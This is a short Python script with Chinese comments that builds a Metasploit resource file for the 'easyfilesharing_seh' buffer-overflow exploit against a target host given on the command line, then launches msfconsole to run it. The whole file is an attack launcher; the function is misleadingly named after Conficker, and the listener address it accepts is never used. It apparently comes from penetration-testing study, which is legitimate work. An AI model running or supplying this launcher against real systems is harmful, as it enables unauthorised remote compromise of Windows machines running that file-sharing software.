import os
import optparse

def confickerExploit(configFile,target,lhost):
    configFile.write('use exploit/windows/http/easyfilesharing_seh \n')
    configFile.write('set rhost '+str(target)+'\n')
    configFile.write('run \n')
def main():
    configFile=open('configure.rc','w')
    usage='[-]Usage %prog -H <RHOSTS> -l/-L <LHOST> '
    parser=optparse.OptionParser(usage)
    parser.add_option('-H',dest='target',type='string',help='target host')           #目标主机
    parser.add_option('-l','-L',dest='lhost',type='string',help='listen address')    #我们的主机
    (options,args)=parser.parse_args()
    target=options.target
    lhost=options.lhost
    if (target==None)|(lhost==None):
        print (parser.usage)
        exit(0)
    confickerExploit(configFile,target,lhost)
    configFile.close()
    print(target+lhost)
    os.system('msfconsole -r configure.rc')  #启动metasploit并读取配置文件
if __name__=='__main__':
    main()
